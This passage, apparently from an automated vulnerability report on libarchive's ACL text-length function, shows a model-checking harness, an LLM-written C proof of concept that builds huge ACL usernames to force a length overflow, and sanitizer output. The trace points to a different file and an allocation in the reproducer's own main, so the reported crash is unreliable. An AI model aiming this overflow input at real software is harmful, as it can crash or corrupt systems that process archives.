        __CPROVER_assume(type == 0x00000100 || type == 0x00000200 || 
                        type == 0x00000400 || type == 0x00000800 || 
                        type == 0x00001000 || type == 0x00002000);
        entry->type = type;
        
        entry->permset = nondet_int();
        entry->id = nondet_int();
        __CPROVER_assume(entry->id >= 0);
        
        /* Initialize archive_mstring - set to zero for simplicity */
        memset(&entry->name, 0, sizeof(struct archive_mstring));
        
        entry->next = NULL;
        
        if (prev == NULL) {
            acl->acl_head = entry;
        } else {
            prev->next = entry;
        }
        prev = entry;
    }
    
    /* Set up parameters for archive_acl_text_len */
    int want_type = nondet_int();
    /* want_type should be one of the valid type combinations */
    __CPROVER_assume(want_type == 0x00000100 || 
                    want_type == 0x00000200 || 
                    want_type == (0x00000100 | 0x00000200) ||
                    want_type == (0x00000400 | 0x00000800 | 0x00001000 | 0x00002000));
    
    int flags = nondet_int();
    int wide = nondet_int();
    __CPROVER_assume(wide == 0 || wide == 1);
    
    struct archive *a = NULL;
    struct archive_string_conv *sc = NULL;
    
    /* Constrain wcslen return value to avoid havoc explosion */
    size_t wcslen_ret;
    __CPROVER_assume(wcslen_ret < 1024);
    
    /* Call the function under test */
    size_t result = archive_acl_text_len(acl, want_type, flags, wide, a, sc);
    
    return 0;
}

```

### Dynamic reproducer (bundled at `findings/v7/reproducers/archive_acl__archive_acl_text_len__archive_acl_text_len.overflow.3.c`)

This is the 1-of-1 attempt the dyn-val LLM produced that triggered the sanitizer. Compile + link against a sanitiser-instrumented libarchive .so:

```sh
gcc -fsanitize=address,undefined -g -O1 -I/path/to/libarchive \
    archive_acl__archive_acl_text_len__archive_acl_text_len.overflow.3.c -L/path/to/libarchive/build -larchive -o repro
LD_LIBRARY_PATH=/path/to/libarchive/build ./repro
```

```c
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

int main(void) {
    struct archive_entry *entry;
    char *text;
    ssize_t text_len;
    int flags = ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID;
    
    entry = archive_entry_new();
    if (!entry) {
        fprintf(stderr, "Failed to create entry\n");
        return 1;
    }
    
    /* Create a very long username that will cause length overflow
     * when converted to wide characters and accumulated in archive_acl_text_len.
     * We need the length calculation to overflow size_t and wrap around to a small value.
     * 
     * Each ACL entry adds:
     * - base overhead (tag name, colons, perms, etc): ~50 bytes
     * - username length
     * - numeric ID if EXTRA_ID flag set: ~10 bytes
     * 
     * To overflow size_t (on 64-bit: 2^64-1), we need massive strings.
     * However, a more practical overflow is when the length calculation wraps
     * due to repeated additions of very large values.
     * 
     * Let's create multiple ACL entries with extremely long usernames.
     * Each username will be several megabytes, and we'll add many entries.
     */
    
    size_t username_len = 16 * 1024 * 1024; /* 16 MB username */
    char *long_username = malloc(username_len + 1);
    if (!long_username) {
        fprintf(stderr, "Failed to allocate username\n");
        archive_entry_free(entry);
        return 1;
    }
    
    /* Fill with valid UTF-8 characters (ASCII 'a' for simplicity) */
    memset(long_username, 'a', username_len);
    long_username[username_len] = '\0';
    
    /* Add multiple ACL entries with this extremely long username
     * The goal is to make archive_acl_text_len overflow when it sums up:
     * length += len (where len is the username length)
     * 
     * With enough entries, the cumulative length will overflow size_t
     */
    
    int num_entries = 256; /* Add many entries to amplify the overflow */
    
    for (int i = 0; i < num_entries; i++) {
        /* Add user ACL entry with extremely long username */
        archive_entry_acl_add_entry(entry,
            ARCHIVE_ENTRY_ACL_TYPE_ACCESS,  /* type */
            ARCHIVE_ENTRY_ACL_READ,          /* permset */
            ARCHIVE_ENTRY_ACL_USER,          /* tag */
            i,                                /* qual (user id) */
            long_username);                   /* name */
    }
    
    /* Now call archive_entry_acl_to_text which internally calls archive_acl_text_len
     * If the length calculation overflows, it will return a small value,
     * causing malloc to allocate a small buffer, then the text generation
     * will overflow that buffer.
     */
    text = archive_entry_acl_to_text(entry, &text_len, flags);
    
    if (text) {
        /* If we got here, the overflow might have occurred during text generation */
        printf("Generated ACL text of length: %zd\n", text_len);
        free(text);
    } else {
        printf("archive_entry_acl_to_text returned NULL\n");
    }
    
    free(long_username);
    archive_entry_free(entry);
    
    return 0;
}
```

### Sanitizer output

```text
=================================================================
==187120==ERROR: AddressSanitizer: requested allocation size 0x4000000000000000 (0x4000000000001000 after adjustments for alignment, red zones etc.) exceeds maximum supported size of 0x10000000000 (thread T0)
    #0 0x7b05412fd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x600360a6b4f6 in main /tmp/libarchive_judge_v7/judge_v7/archive_acl/archive_acl_text_len/dynamic/archive_acl_text_len/reproducer_attempt1.c:22
    #2 0x7b054062a1c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #3 0x7b054062a28a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #4 0x600360a6b304 in _start (/tmp/libarchive_judge_v7/judge_v7/archive_acl/archive_acl_text_len/dynamic/archive_acl_text_len/reproducer_attempt1.bin+0x2304) (BuildId: 16ca064e933d0204346260433366e4ecc8aa659a)

==187120==HINT: if you don't care about these errors you may set allocator_may_return_null=1
SUMMARY: AddressSanitizer: allocation-size-too-big ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69 in malloc
==187120==ABORTING

```

## Caveats

- This is an *automated* finding. The CBMC counterexample is real; the
  realism judgement is an LLM call.
- Grade **B** findings reproduced a crash in libarchive but not the
  exact CBMC property class.
- Sweep `judge_v7` was still in progress when this report was generated;
  more findings may follow. See `findings/v7/index.md`.
- The bundled reproducer hit the sanitizer when compiled + linked
  against the libarchive build at the path noted above. Other builds
  (different libarchive version, -O2 vs -O0, different libc) may not
  reproduce.
